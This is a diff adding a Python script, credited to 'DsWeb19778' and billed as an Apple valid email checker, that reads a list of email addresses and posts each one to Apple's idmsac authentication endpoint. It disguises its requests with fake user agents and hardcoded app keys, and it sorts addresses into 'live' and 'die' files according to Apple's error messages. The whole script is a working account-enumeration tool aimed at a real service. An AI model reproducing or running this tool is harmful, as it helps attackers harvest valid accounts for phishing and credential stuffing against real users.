@@ -1,0 +1,97 @@
+# Codeed By DsXWEB19778
+# Python LOV3er
+# Contact To facebook.com/name.path
+# Github/DsWeb19778
+import requests as p
+import datetime as dt
+import platform as ps
+from fake_useragent import UserAgent
+import os
+import time
+import colorama as c
+from termcolor import colored
+from os import path as y
+# SET COLOR :
+red = c.Fore.LIGHTRED_EX
+green = c.Fore.LIGHTGREEN_EX
+yellow = c.Fore.LIGHTYELLOW_EX
+giv_p = ps.system()
+if(giv_p == "Windows"):
+	os.system("cls")
+	color_green = "a"
+	color_red = "c"
+	os.system("color "+str(color_red))
+else:
+	os.system("clear")
+print (""" 
+  DDDDDDDDD   SSSSSSSSSS 
+  DD     DD   SS      SS
+  DD     DD           SS
+  DD     DD   SSSSSSSSSS     Accurate 100%
+  DD     DD   SS             DSWEB19778  
+  DD     DD   SS      SS     2019
+  DDDDDDDDD   SSSSSSSSSS          
+""")
+print("[+] Coded By DsWeb19778 >> 2019 [REALYEAR]")
+print("[+] CopyRight | >> facebook.com/name.path")
+print("[+] APPLE VALID EMAIL CHECKER ... ")
+def mydate(): # FUnction FOr DATE
+    year = dt.datetime.now().year
+    month = dt.datetime.now().month
+    day = dt.datetime.now().day
+    print("[+] Scan at "+str(year)+"/"+str(month)+"/"+str(day))	
+mydate()
+# Url Exploited 
+url = "https://idmsac.apple.com/authenticate"
+# hahah Mailist
+appleId = raw_input(">> My Mailist File /..//..>>>> ")
+print(">> RZLT FILE...")
+time.sleep(3)
+# Create File RZT
+if(y.isdir("rzlt")):
+	print("[+] Dir Exist.")
+else:
+	os.mkdir("rzlt")
+	print("[+] File Created.")
+print("[+] Start Scaning ... \n")
+# Data SET
+env = "PROD"
+accNameLocked = env
+accountPassword = "1o"
+appIdKey = "3b356c1bac5ad9735ad62f24d43414eb59715cc4d21b178835626ce0d2daa77d"
+fdcBrowserData = ""
+language = "US-EN"
+openiForgotInNewWindow = "true"
+path = "/"
+requestUri = "/login.html"
+rv = "1"
+#scnt = "31b0020ec593370016a61dc388f8965e"
+scnt = "245d753256f3829f1a27f2db4c918cb6"
+view = "5"
+Mode_File = "r+"
+try:
+  open_file = open(appleId,Mode_File)
+  read_me = open_file.readlines()
+  #print("We have ERROR FILE :>> "+str(e))  
+  for i in read_me:
+      i.strip()
+      # POST DATA 
+      get_data = {"env":env,"accNameLocked":accNameLocked,"accountPassword":accountPassword,"appIdKey":appIdKey,"appleId":i,"fdcBrowserData":fdcBrowserData,"language":language,"openiForgotInNewWindow":openiForgotInNewWindow,"path":path,"requestUri":requestUri,"rv":rv,"scnt":scnt,"view":view}
+      my_fake_s = UserAgent() # GEN FAKE AGENT 
+      headers = {'User-Agent': my_fake_s.chrome}
+      connect = p.post(url,params=get_data,headers=headers).content
+      valid_msg = "Application has insufficient privileges to perform this action"
+      dia_msg = "Your Apple ID or password was entered incorrectly."
+      #get_listed = get_email_validation["result"]
+      if (valid_msg in connect):
+        	print(green+"[+] Valid :>> "+i)
+        	save_valid = open("rzlt/live.txt","a+")
+        	save_valid.write(i+"\n")	
+      elif(dia_msg in connect):
+        	print(red+"[-] Die :>> "+i)
+        	save_invalid = open("rzlt/die.txt","a+")
+        	save_invalid.write(i+"\n")
+      else:
+          print(yellow+"[+] LIMITED :>> "+i)  
+except IOError as e:
+  print("[-_-] We have ERROR FILE :>> "+str(e))
